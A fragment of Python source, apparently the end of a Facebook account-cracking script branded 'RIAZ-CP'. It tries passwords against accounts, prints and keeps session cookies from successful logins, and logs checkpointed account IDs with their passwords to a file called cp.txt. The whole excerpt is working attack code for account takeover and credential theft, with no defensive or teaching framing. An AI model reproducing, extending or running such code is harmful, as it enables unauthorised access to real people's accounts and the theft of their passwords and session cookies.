                print(f'{P}[{H}√{P}] COOKIES : {K}%s{P}'%(coki))
                cek_apk(session,coki)
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[RIAZ-CP] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
                open('cp.txt', 'a').write(cid+' | '+ps+ua+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r   [%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
main()
